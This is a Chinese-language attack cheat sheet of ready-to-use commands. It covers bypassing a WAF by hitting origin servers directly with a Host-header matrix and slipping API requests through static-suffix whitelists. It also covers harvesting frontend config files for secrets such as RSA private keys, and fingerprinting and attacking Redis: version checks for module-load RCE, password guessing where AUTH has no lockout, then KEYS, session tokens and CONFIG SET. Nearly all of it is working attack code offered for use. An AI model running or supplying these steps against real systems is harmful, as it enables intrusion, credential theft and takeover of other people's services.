# 通道矩阵 · 可直接改用的命令片段

`$H` = 真域名，`$IP` = 候选源站 IP。判定永远看「状态码 + 长度 + body 前 120 字」。

## 1. 源站直连矩阵（绕 WAF 第一优先）
一个 IP 要按 **Host 全矩阵**扫，不要只测一个 Host。

```bash
for ip in <候选源站IP...>; do
  for h in <主域> <别名域> <各子域>; do
    for p in / /_app.config.js /<API前缀>/getInfo /<API前缀>/getInfo.json; do
      curl -sk -m 12 -H "Host: $h" -o /tmp/o \
        -w "$ip  $h  $p  %{http_code}  %{size_download}\n" "https://$ip$p"
      head -c 120 /tmp/o; echo
    done
  done
done
```

⚠ 源站上可能出现公网 vhost **没有的 location**（公网只认 `/test-api`，源站 `/prod-api` 也活）⇒ 源站是更大的攻击面。

## 2. 过 WAF：静态后缀通道
```bash
curl -sk -H "Host: $H" "https://$H/<API前缀>/<真路径>.json"   # 后缀白名单 + 路由仍命中真 controller
curl -sk -H "Host: $H" "https://$H/robots.txt"               # 白名单按后缀判定 ⇒ 不存在的文件路径也放行
```

## 3. 挑战页 / 网关 / 应用 三态判定
```python
challenge = ("renderData" in t or "_waf_bd8ce2ce37" in t or len(t) == 110310)
gateway   = (len(t) < 80 and "Invalid encrypted request" in t)   # 恒定短体 ⇒ 网关前置闸
app_401   = (len(t) < 200 and '"code"' in t and "/" in t)         # body 回显 path ⇒ 活应用 catch-all
```

## 4. 前端发布配置收割 + 正确切分
```bash
curl -sk -H "Host: $H" "https://$IP/_app.config.js" -o cfg.js
```
```python
k = t.find("={"); e = t.find("};Object.freeze")      # 不要用 rfind('}')
body = t[k+1:e+1] if e > 0 else t[k+1:]
d = json.loads(body)
for kk, vv in d.items():
    print(kk, len(str(vv)))                          # 先回显键名长度自证解析成功
```
关注键：`VITE_GLOB_API_URL` / `VITE_GLOB_USERTYPE` / `VITE_GLOB_ENABLE_ENCRYPT` / `VITE_GLOB_RSA_PRIVATE_KEY` / `VITE_GLOB_APPID`。

## 5. 无 banner 端口定指纹 + Redis 版本推断
```bash
printf 'GET / HTTP/1.0\r\n\r\n' | timeout 5 nc -nv <ip> <port>
# 回 "-ERR wrong number of arguments for 'GET' command" ⇒ Redis
```
```
PING                  -> +PONG 或 NOAUTH Authentication required
INFO server           -> 版本 / redis_mode
ACL WHOAMI            -> 未知命令 ⇒ <6.0
MODULE LIST           -> 未知命令 ⇒ <4.0（MODULE LOAD RCE 排除）
DBSIZE / INFO keyspace-> 键空间规模
```
AUTH 无锁定 ⇒ 靶向小列表可串行试；命中后才谈 `KEYS`/会话令牌/`CONFIG SET`。
